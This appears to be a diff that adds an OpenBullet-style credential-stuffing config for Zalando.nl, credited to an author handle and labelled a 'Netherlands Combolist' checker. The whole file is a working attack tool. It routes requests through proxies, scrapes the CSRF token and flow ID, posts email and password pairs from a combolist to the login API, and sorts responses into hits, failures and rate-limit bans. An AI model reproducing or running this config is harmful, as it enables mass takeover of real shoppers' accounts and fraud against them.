@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "Zalando.nl",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-26T22:16:20.7929456+04:00",
+  "AdditionalInfo": ".NL Netherlands Combolist - FAST -",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#ADDRESS REQUEST GET "https://accounts.zalando.com/authenticate?request=eyJjbGllbnRfaWQiOiJmYXNoaW9uLXN0b3JlLXdlYiIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwic2NvcGVzIjpbIm9wZW5pZCJdLCJyZWRpcmVjdF91cmkiOiJodHRwczovL3d3dy56YWxhbmRvLm5sL3Nzby9jYWxsYmFjayIsInN0YXRlIjoiZXlKdmNtbG5hVzVoYkY5eVpYRjFaWE4wWDNWeWFTSTZJbWgwZEhCek9pOHZkM2QzTG5waGJHRnVaRzh1Ym13dklpd2lkSE1pT2lJeU1ESXlMVEF5TFRJMlZERTNPalUzT2pBMldpSjkiLCJub25jZSI6IjlmZDg5ZTU4LTdhMzYtNGU3ZC04MmI1LWU2OTVkOTkwODEyNCIsInVpX2xvY2FsZXMiOlsibmwtTkwiXSwicmVxdWVzdF9pZCI6IkF5M3lyVjNtZmREKzZJbDQ6YzFlMDJkMTAtNTJhNi00MTYzLTk0ZGItZDIyNDE4NTVkNDc2OlRZNXVRLUN4S0k2RGoyckwifQ==&ui_locales=nl-NL&sales_channel=00f2a393-6889-4fc0-8cd9-86e454e6dfa3" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CSRF PARSE "<COOKIES(csrf-token)>" LR "" "" -> VAR "CSRF" 
+
+#FLOWID PARSE "<SOURCE>" LR "x-flow-id%22%3A%22" "%22" -> VAR "FLOWID" 
+
+#YASH PARSE "<ADDRESS>" LR "https://accounts.zalando.com/authenticate?request=" "&" -> VAR "YASH" 
+
+#saleschannel PARSE "<ADDRESS>" LR "&sales_channel=" "" -> VAR "saleschannel" 
+
+#GUID FUNCTION RandomString "00?m?m?m?m?m?m-?m?m?m?m-4?m?m?m-?m?m?m?m-?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "GUID" 
+
+#GUID1 FUNCTION ToLowercase "<GUID>" -> VAR "GUID1" 
+
+#LENGTH FUNCTION Length "{\"email\":\"<USER>\",\"secret\":\"<PASS>\",\"request\":\"<YASH>\"}" -> VAR "LENGTH" 
+
+#LOGIN REQUEST POST "https://accounts.zalando.com/api/login" 
+  CONTENT "{\"email\":\"<USER>\",\"secret\":\"<PASS>\",\"request\":\"<YASH>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: <LENGTH>" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://accounts.zalando.com" 
+  HEADER "referer: https://accounts.zalando.com/authenticate?request=<YASH>&ui_locales=nl-NL&sales_channel=<GUID1>" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+  HEADER "x-csrf-token: <CSRF>" 
+  HEADER "x-flow-id: <FLOWID>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":false" 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":true" 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "ref_id" 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "email\": true," 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+#LoginAt FUNCTION Constant "https://zalando.nl" -> CAP "LoginAt" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config bY " 
+
